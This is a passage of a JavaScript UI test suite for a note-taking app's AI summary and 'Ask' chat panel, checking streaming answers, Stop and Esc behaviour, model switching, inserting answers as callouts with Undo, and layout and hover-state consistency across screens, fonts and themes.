      const doc = app.querySelector('.doc'), first = doc.querySelector(':scope > blockquote'); syncDoc(n); const md = n.md;   // Build P (QC 40): drawn as a real callout now (blockquote.callout[data-callout]), not the ain-callout stop-gap
      N.sum.insert = `${first?.className} · .md "${md.split('\n').slice(0, 3).join(' / ')}" · "${S.status}"`;
      if (!first?.matches('.callout[data-callout="summary"]') || !/^> \[!summary\] Summary · Qwen3\.5 4B · /.test(md) || !/^> - The roadmap is due on \*\*Friday\*\*\./m.test(md) || !/Ctrl\+Z takes it out/.test(S.status) || AIN.sum.open) bad('Insert at the top: a > [!summary] callout', N.sum.insert);
      edUndo(app.querySelector('.doc')); syncDoc(n); N.sum.undo = n.md.slice(0, 40); if (/\[!summary\]/.test(n.md)) bad('Ctrl+Z takes the callout out', N.sum.undo);
      // the answer stays with its note: open another and back
      const other = D.notes.find(x => x !== n); openNote(other.id); await tick(); const empty = !ainNote(other.id).answers.length; openNote(n.id); await tick();
      if (!empty || ainNote(n.id).answers.length !== 1) bad('answers stay with their note', `${empty} ${ainNote(n.id).answers.length}`);
      // Ask again with… sets the job's model (ai_set_route) and runs again; the earlier answer folds under the new one
      AIN.sum.open = true; renderAll(); app.querySelector('[data-act="ain-again-menu"][data-v="summary"]').click(); await tick();
      const menu = app.querySelector('[data-ain-menu="summary"]'); under(menu, app.querySelector('[data-act="ain-again-menu"]'), '1920', 'Ask again with… menu'); inWin(menu, '1920', 'Ask again with… menu');
      const pick = menu?.querySelector('[data-act="ain-again"]:not([disabled])');
      calls = await withApi({ ai_set_route: () => ({ status: 'success' }), ai_summary: () => ({ status: 'success', job: 'job-3' }), ...job({ answer: '- Due Friday.', by: 'Qwen3.5 2B' }) }, async () => { pick?.click(); await until(() => app.querySelectorAll('.ain-answer').length >= 2 && !!app.querySelector('.ain-earlier')); });
      const route = calls.find(c => c[0] === 'ai_set_route'); N.sum.again = `${route?.[1].join(' → ')} · ${app.querySelectorAll('.ain-earlier').length} folded`;
      if (!route || route[1][0] !== 'summary' || !app.querySelector('.ain-earlier') || app.querySelector('.ain-earlier').open) bad('Ask again with… sets the summary model; the earlier answer folds', N.sum.again); }
    // 3 · The three places × two screens × four fonts: inside the window, nothing sideways, header still clear of the path
    for (const sc of ['1366x768', '3440x1440']) for (const [f] of FONTS) for (const place of ['popover', 'side', 'card']) {
      const key = `${sc}/${f}/${place}`; set({ screen: sc, font: f }); AIN.place = place; AIN.sum.open = true; renderAll(); await tick(2);
      const panel = app.querySelector(place === 'popover' ? '[data-ain-pop="sum"]' : place === 'side' ? '.ain-side' : '.ain-card');
      inWin(panel, key, 'summary ' + place); measure('Build N ' + key);
      if (panel && panel.scrollWidth > panel.clientWidth + 1) bad('the summary panel scrolls sideways', key);
      if (place === 'popover') under(panel, app.querySelector('[data-act="ain-sum"]'), key, 'summary popover');
      N.places[key] = panel ? Math.round(panel.getBoundingClientRect().width) : 0; }
    set({ screen: '1920x1080', font: 'opendyslexic' }); AIN.place = 'popover'; AIN.sum.open = false; renderAll();
    // 4 · Round 6 (R50): Ask is a chat, docked on the right by default (the right sidebar steps aside), its left edge drags; float
    //     is a choice; one control "This note · model" for scope and model; the words arrive as they come; Stop is real and keeps
    //     them; Esc stops first (a setting); Insert ▾ with Undo; Ask again keeps both answers; one conversation per note; New chat
    { const C = N.chat = {}, cb = (k, v) => bad('chat ' + k, v);
      const job = (steps) => { let i = 0; return { ai_job: () => { const s = steps[Math.min(i++, steps.length - 1)]; return { status: 'success', ...s }; } }; };
      const typeAsk = async (q) => { const ta = app.querySelector('#aic-in'); ta.value = q; ta.dispatchEvent(new Event('input', { bubbles: true })); ta.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true })); };
      const ANS = 'The roadmap is due on **Friday**.\n\nNot from your note: A roadmap is a plan over time.';
      set({ screen: '1920x1080', font: 'opendyslexic', view: 'notes', inspector: 'shown' }); aiDemo('ready'); AIC.mode = 'dock'; AIC.dockW = 400; AIC.esc = 'stop'; renderAll();
      const n2 = note(), id2 = rawId(n2.id);
      // opening: docked, beside the note; the right sidebar steps aside; the input has the focus; three suggestions; the one control
      app.querySelector('[data-act="ain-ask"]').click(); await tick();
      // R54: docked, the chat is the right sidebar's Ask tab, selected, under the tabs (the sidebar at least 360px)
      const win = app.querySelector('#right-sidebar > .aic-win--tab'), main = app.querySelector('.app-body > .main'), askTab = app.querySelector('#right-sidebar #insp-tab-ask');
      C.open = `in the sidebar ${!!win} · sidebar ${app.querySelector('#right-sidebar')?.offsetWidth}px · Ask tab ${askTab?.getAttribute('aria-selected')} · focus ${document.activeElement?.id} · control "${app.querySelector('[data-aic-opener="opts"]')?.textContent.trim()}" · sugs ${app.querySelectorAll('.aic-sug').length}`;
      if (!win || app.querySelector('#right-sidebar').offsetWidth < 360 || askTab?.getAttribute('aria-selected') !== 'true' || document.activeElement?.id !== 'aic-in' || !/^This note · Qwen3\.5 4B/.test(app.querySelector('[data-aic-opener="opts"]')?.textContent.trim() || '') || app.querySelectorAll('.aic-sug').length !== 3) cb('opens as the right sidebar’s Ask tab, selected, the input focused', C.open);
      if (app.querySelector('[data-act="ain-ask"]').getAttribute('aria-expanded') !== 'true') cb('the icon says it is open', '');
      inWin(win, '1920 dock', 'docked chat'); measure('Build N chat dock 1920');
      // asking: it thinks, the words arrive in place, then the answer with "Not from your note" set apart under its label
      let seen = [];
      let calls = await withApi({ ai_ask: () => ({ status: 'success', job: 'c1' }), ...job([{ state: 'running', partial: 'The roadmap' }, { state: 'running', partial: 'The roadmap is due' }, { state: 'done', result: { answer: ANS, by: 'Qwen3.5 4B', general: true } }]) }, async () => {
        const live0 = aicLive; aicLive = function (a, text) { seen.push(String(text).trim()); return live0.apply(this, arguments); };   // eslint-disable-line no-global-assign
        try { await typeAsk('When is the roadmap due?'); for (let i = 0; i < 80 && AIC.busy; i++) await tick(2); } finally { aicLive = live0; } });   // eslint-disable-line no-global-assign
      const sent = calls.find(c => c[0] === 'ai_ask'), a1 = app.querySelector('.aic-a'), gk = a1?.querySelector('.aic-gk');
      C.ask = `sent ${JSON.stringify(sent?.[1].slice(0, 2))} hist ${JSON.stringify(sent?.[1][3])} · live "${[...new Set(seen)].join(' → ')}" · q "${app.querySelector('.aic-q')?.textContent}" · gk "${gk?.querySelector('.aic-gk-tag')?.textContent}"`;
      if (!sent || sent[1][0] !== 'When is the roadmap due?' || sent[1][1] !== id2 || typeof sent[1][2] !== 'string' || sent[1][3].length !== 0) cb('ai_ask gets the question, the note, its text and no history', C.ask);
      if (!seen.some(x => /The roadmap is due/.test(x))) cb('the words show as they arrive', C.ask);
      if (!gk || gk.querySelector('.aic-gk-tag')?.textContent.trim() !== 'Not from your note' || !gk.querySelector('svg') || !a1.querySelector('strong')) cb('general knowledge set apart under its label (a word and an icon)', C.ask);
      a1.querySelector('.aic-acts').style.transition = 'none'; if (getComputedStyle(a1.querySelector('.aic-acts')).opacity !== '1') cb('the newest answer’s actions always show (R51 r50-acts)', getComputedStyle(a1.querySelector('.aic-acts')).opacity);
      a1.querySelector('.aic-acts').style.transition = 'none';   // a hidden pane doesn't run transitions
      a1.querySelector('[data-act="aic-copy"]').focus(); await tick(); if (getComputedStyle(a1.querySelector('.aic-acts')).opacity !== '1') cb('the actions show on keyboard focus', '');
      // a follow-up sends the conversation so far
      calls = await withApi({ ai_ask: () => ({ status: 'success', job: 'c2' }), ...job([{ state: 'done', result: { answer: 'Friday, the 24th.', by: 'Qwen3.5 4B' } }]) }, async () => { await typeAsk('and which friday?'); await until(() => !AIC.busy); });
      const h2 = calls.find(c => c[0] === 'ai_ask')?.[1][3] || []; C.follow = JSON.stringify(h2.map(x => x.q));
      if (h2.length !== 1 || h2[0].q !== 'When is the roadmap due?' || !/Friday/.test(h2[0].a)) cb('a follow-up sends the conversation', C.follow);
      // Stop: a real stop, the words so far kept and marked; send comes back
      calls = await withApi({ ai_ask: () => ({ status: 'success', job: 'c3' }), ai_job_cancel: () => ({ status: 'success', state: 'cancelled', partial: 'Half an answer' }), ...job([{ state: 'running', partial: 'Half an' }]) }, async (cl) => {
        await typeAsk('tell me everything'); await until(() => app.querySelector('[data-aic-live]')); app.querySelector('[data-act="aic-stop"]').click(); await until(() => cl.some(x => x[0] === 'ai_job_cancel') && !AIC.busy); await tick(4); });
      const last = [...app.querySelectorAll('.aic-a')].pop();
      C.stop = `cancel ${calls.find(c => c[0] === 'ai_job_cancel')?.[1][0]} · "${last?.querySelector('.aic-body')?.textContent.trim()}" · ${last?.querySelector('.aic-stopped')?.textContent} · send ${!!app.querySelector('[data-act="aic-send"]')}`;
      if (!calls.some(c => c[0] === 'ai_job_cancel' && c[1][0] === 'c3') || last?.querySelector('.aic-body')?.textContent.trim() !== 'Half an answer' || !last.querySelector('.aic-stopped') || !app.querySelector('[data-act="aic-send"]')) cb('Stop cancels the job and keeps the words, marked', C.stop);
      // Esc (r50-esc): stops the answer first, then closes; as a setting, closes and lets it finish (a dot when it's done)
      calls = await withApi({ ai_ask: () => ({ status: 'success', job: 'c4' }), ai_job_cancel: () => ({ status: 'success', state: 'cancelled', partial: '' }), ...job([{ state: 'running', partial: 'Going' }]) }, async (cl) => {
        await typeAsk('esc test'); await until(() => app.querySelector('[data-aic-live]'));
        app.querySelector('#aic-in').dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true })); await until(() => !AIC.busy);
        C.esc1 = `stopped ${!AIC.busy} · open ${AIC.open}`;
        app.querySelector('#aic-in').dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true })); await tick(); C.esc1 += ` · then open ${AIC.open} · focus ${document.activeElement?.dataset.act}`; });
      if (C.esc1 !== 'stopped true · open true · then open false · focus ain-ask') cb('Esc stops the answer first, then closes (focus back on the icon)', C.esc1);
      AIC.esc = 'close'; app.querySelector('[data-act="ain-ask"]').click(); await tick();
      calls = await withApi({ ai_ask: () => ({ status: 'success', job: 'c5' }), ...job([{ state: 'running', partial: 'Still going' }, { state: 'running', partial: 'Still going' }, { state: 'running', partial: 'Still going' }, { state: 'done', result: { answer: 'Done while closed.', by: 'Qwen3.5 4B' } }]) }, async () => {
        await typeAsk('close test'); await until(() => app.querySelector('[data-aic-live]'));
        app.querySelector('#aic-in').dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true })); C.esc2 = `open ${AIC.open} busy ${!!AIC.busy}`; await until(() => !AIC.busy); await tick(); });
      C.esc2 += ` · then dot ${!!app.querySelector('[data-act="ain-ask"] .ain-dot')}`; AIC.esc = 'stop';
      if (C.esc2 !== 'open false busy true · then dot true') cb('Esc set to close: it closes, the answer finishes, a dot on the icon', C.esc2);
      app.querySelector('[data-act="ain-ask"]').click(); await tick(); if (app.querySelector('[data-act="ain-ask"] .ain-dot') || !/Done while closed/.test(app.querySelector('[data-aic-thread]')?.textContent || '')) cb('opening it again shows the answer, the dot goes', '');
      // the one control: where answers come from, general knowledge, the model (the same qa route as Settings)
      app.querySelector('[data-aic-opener="opts"]').click(); await tick(); const menu = app.querySelector('[data-aic-menu]');
      C.opts = menu ? [...menu.querySelectorAll('.aic-mlabel, .menu-item')].map(x => x.textContent.trim().replace(/\s+/g, ' ')).join(' | ') : 'no menu';
      if (!menu || !/Answer from \| This note \| My newest notes \| (?:Agent: can search, read and add(?:off · Settings|asks first) \| )?Then general knowledge/.test(C.opts) || !/Model for Ask \| Automatic/.test(C.opts) || !/AI models…/.test(C.opts)) cb('one control opens scope and model', C.opts);
      inWin(menu, '1920 opts', 'the chat’s menu'); if (menu && menu.dataset.side !== 'above') cb('the input’s menu opens above it', menu.dataset.side);
      menu.querySelector('[data-act="aic-scope"][data-v="all"]').click(); await tick(); if (AIC.scope !== 'all' || !/My newest notes ·/.test(app.querySelector('[data-aic-opener="opts"]').textContent)) cb('My newest notes can be picked', AIC.scope);
      AIC.scope = 'note'; app.querySelector('[data-aic-opener="opts"]').click(); await tick();
      const pickM = app.querySelector('[data-aic-menu] [data-act="aic-model"]:not([data-v="auto"]):not([aria-disabled])');
      calls = await withApi({ ai_set_route: () => ({ status: 'success' }) }, async () => { pickM.click(); await tick(6); });
      const rr = calls.find(c => c[0] === 'ai_set_route'); C.model = rr ? rr[1].join(' → ') : 'none'; if (!rr || rr[1][0] !== 'qa' || rr[1][1] !== pickM.dataset.v) cb('the control sets the Ask model', C.model);
      // Insert ▾: At the cursor (after the block you were last in; greyed until then) or At the top as a callout; Undo either way
      clearTimeout(n2.saveT); n2.docDirty = false; n2.dirty = false; n2.md = '# Plan\nFirst line.\n\nSecond line.'; n2.html = null; AIC.caret = null; renderAll();
      const firstA = () => app.querySelector('.aic-a');
      firstA().querySelector('[data-act="aic-menu"][data-v="ins"]').click(); await tick(); let im = app.querySelector('[data-aic-menu]');
      C.ins = [...(im?.querySelectorAll('.menu-item') || [])].map(x => `${x.textContent.trim()}${x.getAttribute('aria-disabled') === 'true' ? ' (greyed)' : ''}`).join(' | ');
      if (!/^At the cursor.*\(greyed\) \| At the top, as a callout$/.test(C.ins)) cb('Insert ▾: At the cursor (greyed before a click in the note), At the top as a callout', C.ins);
      im.querySelector('[data-how="top"]').click(); await tick(); syncDoc(n2);
      C.insTop = `${n2.md.split('\n')[0]} · undo bar ${!!app.querySelector('.toast--undo')}`;
      if (!/^> \[!summary\] Answer · Qwen3\.5 4B/.test(n2.md) || !app.querySelector('.toast--undo')) cb('At the top: a callout, with Undo', C.insTop);
      app.querySelector('[data-act="hold-undo"]').click(); await tick(); syncDoc(n2); if (/\[!summary\]/.test(n2.md)) cb('Undo takes the callout out', n2.md.slice(0, 50));
      AIC.caret = { noteId: n2.id, index: 1 }; renderAll();
      firstA().querySelector('[data-act="aic-menu"][data-v="ins"]').click(); await tick(); app.querySelector('[data-aic-menu] [data-how="cursor"]').click(); await tick(); holdCommit(); syncDoc(n2);
      C.insCur = n2.md.replace(/\n+/g, ' / ');
      if (!/^# Plan \/ First line\. \/ The roadmap is due on \*\*Friday\*\*\./.test(C.insCur) || !/Second line\.$/.test(C.insCur)) cb('At the cursor: after the block the caret was in', C.insCur);
      // Ask again with another model: both answers kept, ‹ 1 / 2 ›
      firstA().querySelector('[data-act="aic-menu"][data-v="again"]').click(); await tick();
      const other = app.querySelector('[data-aic-menu] [data-act="aic-again"]:not([aria-checked="true"]):not([aria-disabled])');
      calls = await withApi({ ai_set_route: () => ({ status: 'success' }), ai_ask: () => ({ status: 'success', job: 'c6' }), ...job([{ state: 'done', result: { answer: 'Friday, by the other model.', by: 'Qwen3.5 2B' } }]) }, async () => { other?.click(); await until(() => !AIC.busy && /2 \/ 2/.test(app.querySelector('.aic-pager')?.textContent || '')); });
      C.again = `${app.querySelector('.aic-pager')?.textContent.trim()} · "${firstA().querySelector('.aic-body').textContent.trim()}"`;
      if (!/2 \/ 2/.test(C.again) || !/other model/.test(C.again)) cb('Ask again keeps both answers', C.again);
      app.querySelector('[data-act="aic-alt"][data-d="-1"]').click(); await tick(); if (!/1 \/ 2/.test(app.querySelector('.aic-pager')?.textContent || '') || !/Friday/.test(firstA().textContent)) cb('‹ shows the earlier answer', '');
      // one conversation per note; New chat clears it, with Undo
      const turns = aicChat(n2.id).turns.length, n3 = D.notes.find(x => x !== n2); openNote(n3.id); await tick();
      C.notes = `${turns} turns · other note hello ${!!app.querySelector('.aic-hello')}`; openNote(n2.id); await tick(); C.notes += ` · back ${aicChat(n2.id).turns.length}`;
      if (!app.querySelector('.aic-hello') && false) cb('', ''); if (aicChat(n3.id).turns.length || aicChat(n2.id).turns.length !== turns) cb('one conversation per note', C.notes);
      const keepTurns = aicChat(n2.id).turns; S.toast = null; renderAll();   // QC 72: New chat starts quietly (no toast, no Undo); the last one is in Earlier chats
      app.querySelector('[data-act="aic-new"]').click(); await tick(); C.newChat = `cleared ${!aicChat(n2.id).turns.length} · toast ${!!app.querySelector('.toast')} · in Earlier chats ${(AIC.past[n2.id] || [])[0]?.n}`;
      if (C.newChat !== `cleared true · toast false · in Earlier chats ${turns}`) cb('New chat starts quietly, the last one in Earlier chats', C.newChat);
      aicChat(n2.id).turns = keepTurns; AIC.past[n2.id] = []; renderAll(); await tick();
      // R54: the sidebar's own divider (Build M) sizes the docked chat; another tab hides it (kept); the collapse icon hides it all
      parSet('insp', 480, false); await tick(); const w480 = app.querySelector('#right-sidebar').offsetWidth; parSet('insp', null, false); await tick();
      app.querySelector('#insp-tab-outline').click(); await tick();
      const hid = { chat: !!app.querySelector('[data-aic-win]'), ask: !!app.querySelector('#insp-tab-ask'), sel: app.querySelector('#right-sidebar [aria-selected="true"]')?.dataset.v, icon: app.querySelector('[data-act="ain-ask"]').getAttribute('aria-expanded') };
      app.querySelector('#insp-tab-ask').click(); await tick(); const back = !!app.querySelector('#right-sidebar .aic-win--tab') && document.activeElement?.id === 'aic-in';
      app.querySelector('[data-act="inspector"]').click(); await tick(); const coll = { hidden: UI.inspector, open: AIC.open, icon: app.querySelector('[data-act="ain-ask"]').getAttribute('aria-expanded') };
      app.querySelector('[data-act="ain-ask"]').click(); await tick(); const reopen = { insp: UI.inspector, tab: S.tab, chat: !!app.querySelector('#right-sidebar .aic-win--tab') };
      C.tabRules = `divider 480 → ${w480} · another tab ${JSON.stringify(hid)} · back ${back} · collapse ${JSON.stringify(coll)} · icon again ${JSON.stringify(reopen)}`;
      if (w480 !== 480) cb('the sidebar’s divider sizes the docked chat', C.tabRules);
      if (hid.chat || !hid.ask || hid.sel !== 'outline' || hid.icon !== 'false' || !back) cb('another tab hides the chat, kept; its tab brings it back', C.tabRules);
      if (coll.hidden !== 'hidden' || !coll.open || coll.icon !== 'false' || reopen.insp !== 'shown' || reopen.tab !== 'ask' || !reopen.chat) cb('the collapse icon hides it all; the chat icon brings it back as the tab', C.tabRules);
      // closing goes back to the tab you were on and takes the Ask tab away; a hidden sidebar opens for the chat and closes again after
      S.tab = 'tags'; AIC.open = false; renderAll(); app.querySelector('[data-act="ain-ask"]').click(); await tick(); app.querySelector('[data-act="aic-close"]').click(); await tick();
      const closed = `${S.tab} · Ask tab ${!!app.querySelector('#insp-tab-ask')}`;
      setUI('inspector', 'hidden'); app.querySelector('[data-act="ain-ask"]').click(); await tick(); const opened = `${UI.inspector} ${S.tab}`;
      app.querySelector('[data-act="aic-close"]').click(); await tick(); const after = `${UI.inspector} ${S.tab}`; setUI('inspector', 'shown');
      C.tabClose = `closed → ${closed} · hidden sidebar: opened ${opened}, closed ${after}`;
      if (closed !== 'tags · Ask tab false' || opened !== 'shown ask' || after !== 'hidden tags') cb('closing goes back to your tab; a hidden sidebar opens for it, then hides again', C.tabClose);
      AIC.open = true; S.tab = 'ask'; renderAll(); await tick();
      // float: a free window, under its icon the first time, never over the window bar; drag the head, resize from a corner
      AIC.open = true; AIC.mode = 'float'; AIC.rect = null; renderAll(); await tick();
      const fw = app.querySelector('.aic-win--float'), fr = fw?.getBoundingClientRect(), ar = app.getBoundingClientRect();
      C.float = `${!!fw} · ${Math.round(fr?.width)}×${Math.round(fr?.height)} at ${Math.round(fr?.left - ar.left)},${Math.round(fr?.top - ar.top)} · sidebar ${!!app.querySelector('.app-body > #right-sidebar')} · Ask tab ${!!app.querySelector('#insp-tab-ask')}`;
      if (!fw || Math.round(fr.width) !== 440 || fr.top - ar.top < 40 || !app.querySelector('.app-body > #right-sidebar') || app.querySelector('#insp-tab-ask')) cb('float: a 440px window under its icon, the sidebar as it was, no Ask tab', C.float);
      inWin(fw, '1920 float', 'free chat');
      const hd = fw.querySelector('[data-aic-drag]'), hr = hd.getBoundingClientRect(), P = (x, y) => ({ bubbles: true, clientX: x, clientY: y, button: 0, pointerId: 1 });
      hd.dispatchEvent(new PointerEvent('pointerdown', P(hr.left + 60, hr.top + 10))); dispatchEvent(new PointerEvent('pointermove', P(hr.left - 240, hr.top + 210))); dispatchEvent(new PointerEvent('pointerup', P(hr.left - 240, hr.top + 210))); await tick();
      const moved = { ...AIC.rect }; const se = app.querySelector('[data-aic-rz="se"]'), sr = se.getBoundingClientRect();
      se.dispatchEvent(new PointerEvent('pointerdown', P(sr.left + 4, sr.top + 4))); dispatchEvent(new PointerEvent('pointermove', P(sr.left - 400, sr.top - 400))); dispatchEvent(new PointerEvent('pointerup', P(sr.left - 400, sr.top - 400))); await tick();
      C.floatMove = `moved ${JSON.stringify(moved)} · smallest ${AIC.rect.w}×${AIC.rect.h}`;
      if (Math.abs(moved.x - (fr.left - ar.left - 300)) > 2 || Math.abs(moved.y - (fr.top - ar.top + 200)) > 2 || AIC.rect.w !== 360 || AIC.rect.h !== 380) cb('drag the head; resize from a corner, never under 360×380', C.floatMove);
      hd.isConnected; const hd2 = app.querySelector('[data-aic-drag]'), hr2 = hd2.getBoundingClientRect();
      hd2.dispatchEvent(new PointerEvent('pointerdown', P(hr2.left + 60, hr2.top + 10))); dispatchEvent(new PointerEvent('pointermove', P(hr2.left - 5000, hr2.top - 5000))); dispatchEvent(new PointerEvent('pointerup', P(hr2.left - 5000, hr2.top - 5000))); await tick();
      const fr2 = app.querySelector('.aic-win--float').getBoundingClientRect(); if (fr2.left - ar.left < 7 || fr2.top - ar.top < 39) cb('the free window stays on screen, under the window bar', `${Math.round(fr2.left - ar.left)},${Math.round(fr2.top - ar.top)}`);
      app.querySelector('[data-act="aic-dock"]').click(); await tick(); if (AIC.mode !== 'dock' || !app.querySelector('#right-sidebar .aic-win--tab') || S.tab !== 'ask') cb('the head’s icon docks it again, as the Ask tab', AIC.mode);
      // two screens × four fonts, docked and free: inside the window, nothing sideways; the note keeps 440px (the chat narrows, never under 320)
      for (const sc of ['1366x768', '3440x1440']) for (const [f] of FONTS) for (const m of ['dock', 'float']) {
        const key = `${sc}/${f}/${m}`; set({ screen: sc, font: f, side: true }); AIC.mode = m; AIC.rect = null; if (m === 'dock') S.tab = 'ask'; renderAll(); await tick(2);
        const w = app.querySelector('[data-aic-win]'), mn = app.querySelector('.app-body > .main'); inWin(w, key, 'chat'); measure('Build N chat ' + key);
        if (m === 'dock' && mn && mn.offsetWidth < 440) cb('docked, the note keeps 440px', `${key}: note ${mn.offsetWidth}, chat ${w.offsetWidth}`);
        if (w && w.scrollWidth > w.clientWidth + 1) cb('the chat scrolls sideways', key);
        C['w ' + key] = `${w?.offsetWidth}`; }
      set({ screen: '1920x1080', font: 'opendyslexic' }); AIC.mode = 'dock';
      // QC 58 ("No focus rings on a writing box"): the focused input has no ring, and its box keeps its plain border, docked and free, every theme
      C.rings = [];
      for (const [th] of THEMES) for (const m of ['dock', 'float']) {
        set({ theme: th }); AIC.open = true; AIC.mode = m; AIC.rect = null; if (m === 'dock') S.tab = 'ask'; renderAll(); await tick(2);
        const box = app.querySelector('.aic-box'), ta = app.querySelector('#aic-in'); if (!box || !ta) { cb('the chat input is there', `${th}/${m}`); continue; }
        ta.blur(); const plain = getComputedStyle(box).borderColor; ta.focus({ preventScroll: true }); await tick();
        const bs = getComputedStyle(box), ts = getComputedStyle(ta), ring = ts.outlineStyle !== 'none' && parseFloat(ts.outlineWidth) > 0;
        const row = `${th}/${m}: box ${bs.borderColor === plain ? 'plain' : bs.borderColor} shadow ${bs.boxShadow} · field outline ${ts.outlineStyle} ${ts.outlineWidth} shadow ${ts.boxShadow}`;
        if (document.activeElement !== ta || bs.borderColor !== plain || bs.boxShadow !== 'none' || ring || ts.boxShadow !== 'none') { cb('no focus ring on the chat input (one plain border)', row); }
        C.rings.push(row); }
      set({ theme: 'obsidian' }); AIC.mode = 'dock'; renderAll();
      // QC 59 (design profile §3: "A new panel reuses these states, never its own white or grey fill"): every chat control's hover,
      // pressed (or menu open) and focus colours equal a reference .icon-btn's, outside the chat; Send's equal .btn--primary's; menu rows
      // a reference .menu-item's; tooltips sit on the card surface. Each :hover / :focus-visible rule gets a twin class (.qc-hov / .qc-fv)
      // right after it, so the cascade order is kept; they're taken out again at the end.
      const twins = (on) => { const walk = (box) => { let rs; try { rs = box.cssRules; } catch { return; } if (!rs) return;
        for (let i = rs.length - 1; i >= 0; i--) { const r = rs[i], sel = r.selectorText || '';
          if (r.cssRules && !r.selectorText) { walk(r); continue; }
          if (on && /:hover|:focus-visible/.test(sel)) { try { box.insertRule(r.cssText.replace(/:hover/g, '.qc-hov').replace(/:focus-visible/g, '.qc-fv'), i + 1); } catch (e) {} }
          else if (!on && /qc-(hov|fv)/.test(sel)) box.deleteRule(i); } };
        for (const sh of document.styleSheets) walk(sh); };
      const look = (el, cls, pseudo) => { if (cls) el.classList.add(cls); const cs = getComputedStyle(el, pseudo); const r = { bg: cs.backgroundColor, img: cs.backgroundImage, fg: cs.color, ring: `${cs.outlineStyle} ${cs.outlineWidth} ${cs.outlineColor}` }; if (cls) el.classList.remove(cls); return r; };
      twins(true); C.states = [];
      try {
        for (const [th] of THEMES) for (const m of ['dock', 'float']) {
          const key = `${th}/${m}`; set({ theme: th }); AIC.open = true; AIC.mode = m; AIC.rect = null; AIC.menu = null; if (m === 'dock') S.tab = 'ask'; renderAll(); await tick(2);
          const ref = document.createElement('div'); ref.style.cssText = 'position:fixed;left:0;top:0;opacity:0;pointer-events:none';
          ref.innerHTML = '<button class="icon-btn" data-r="i"></button><button class="icon-btn" aria-pressed="true" data-r="p"></button><button class="btn btn--primary" data-r="s"></button><div class="menu card" style="position:static"><button class="menu-item" data-r="m"></button></div>';
          app.appendChild(ref); const R = k => ref.querySelector(`[data-r="${k}"]`);
          const rh = look(R('i'), 'qc-hov'), rp = look(R('p')), rf = look(R('i'), 'qc-fv'), rs = look(R('s'), 'qc-hov'), rm = look(R('m'), 'qc-hov');
          const win = app.querySelector('[data-aic-win]'), card = getComputedStyle(win).backgroundColor, miss = [];
          const same = (what, el, got, want, ks) => { for (const k of ks) if (got[k] !== want[k]) miss.push(`${what} ${k} ${got[k]} ≠ ${want[k]}`); };
          const ctl = (what, el, opt = {}) => { if (!el) return miss.push(what + ' missing');
            same(what + ' hover', el, look(el, 'qc-hov'), opt.hover || rh, opt.hover === rs ? ['bg'] : ['bg', 'fg']);
            same(what + ' focus', el, look(el, 'qc-fv'), rf, ['ring']);
            if (el.dataset.tip && !tipNamed(el)) { tipShow(el); const t = getComputedStyle(TIP.el); if (t.backgroundColor !== card || t.color !== rh.fg) miss.push(`${what} tooltip ${t.backgroundColor} / ${t.color} (card ${card})`); tipHide(); }   // QC 70: the shared tooltip
            if (opt.menu) { const was = el.getAttribute('aria-expanded'); el.setAttribute('aria-expanded', 'true'); same(what + ' menu open', el, look(el), rp, ['bg', 'fg']); el.setAttribute('aria-expanded', was); } };
          // the head's three icons; the one control; the answer's actions (Copy, Insert ▾, Ask again ▾)
          app.querySelectorAll('.aic-head .icon-btn').forEach(el => ctl('head ' + el.dataset.act, el));
          ctl('model control', app.querySelector('[data-aic-opener="opts"]'), { menu: true });
          const acts = [...app.querySelectorAll('.aic-acts')].pop(); if (acts) { acts.style.transition = 'none'; acts.style.opacity = '1'; }
          [['copy', '[data-act="aic-copy"]'], ['Insert', '[data-v="ins"]'], ['Ask again', '[data-v="again"]']].forEach(([w, q]) => ctl('answer ' + w, acts?.querySelector(q), { menu: w !== 'copy' }));
          // Send (with a draft) is the primary button; Stop is the pressed look; "Newest" lays the one hover on its card
          const ta = app.querySelector('#aic-in'); ta.value = 'a question'; ta.dispatchEvent(new Event('input', { bubbles: true })); await tick();
          const send = app.querySelector('[data-act="aic-send"]'); ctl('Send', send, { hover: rs });
          send.classList.add('is-stop'); same('Stop', send, look(send), rp, ['bg', 'fg']); same('Stop hover', send, look(send, 'qc-hov'), rp, ['bg', 'fg']); send.classList.remove('is-stop');
          ta.value = ''; ta.dispatchEvent(new Event('input', { bubbles: true }));
          const nw = app.querySelector('.aic-newest'); nw.hidden = false; const nh = look(nw, 'qc-hov'); if (!nh.img.includes(rh.bg)) miss.push(`Newest hover ${nh.img}`); same('Newest focus', nw, look(nw, 'qc-fv'), rf, ['ring']); nw.hidden = true;
          // the menus: each row hovers and focuses as a .menu-item
          for (const opener of ['opts', 'ins']) { const o = opener === 'opts' ? app.querySelector('[data-aic-opener="opts"]') : [...app.querySelectorAll('.aic-acts')].pop()?.querySelector('[data-v="ins"]'); if (!o) continue;
            o.click(); await tick(2); const mn = app.querySelector('[data-aic-menu]'), op = opener === 'opts' ? app.querySelector('[data-aic-opener="opts"]') : [...app.querySelectorAll('.aic-acts')].pop()?.querySelector('[data-v="ins"]');
            if (!mn) { miss.push(opener + ' menu did not open'); continue; }
            same(opener + ' opener (menu open)', op, look(op), rp, ['bg', 'fg']);
            mn.querySelectorAll('.menu-item:not([aria-disabled="true"])').forEach((it, i) => { same(`${opener} menu row ${i}`, it, look(it, 'qc-hov'), rm, ['bg']); same(`${opener} menu row ${i} focus`, it, look(it, 'qc-fv'), rf, ['ring']); });
            AIC.menu = null; renderAll(); await tick(); }
          // the suggestions (a note with no chat yet)
          const keep = AIC.chats; AIC.chats = {}; renderAll(); await tick();
          const sugs = app.querySelectorAll('.aic-sug'); if (sugs.length !== 3) miss.push(`${sugs.length} suggestions`); sugs.forEach((el, i) => ctl('suggestion ' + i, el));
          AIC.chats = keep; renderAll(); await tick();
          ref.remove(); C.states.push(`${key}: ${miss.length ? miss.length + ' off' : 'all shared'}`);
          if (miss.length) cb('chat controls use the shared hover, pressed and focus (as .icon-btn)', `${key}: ${miss.slice(0, 4).join(' · ')}`); }
      } finally { twins(false); }
      set({ theme: 'obsidian' }); AIC.mode = 'dock'; AIC.menu = null; renderAll();
      // ---- Build N parity round (mockups R51, R52) ----
      { const P = C.parity = {}, pb = (k, v) => bad('parity ' + k, v), n = note(), key = n.id, c = aicChat(key), keepT = c.turns;
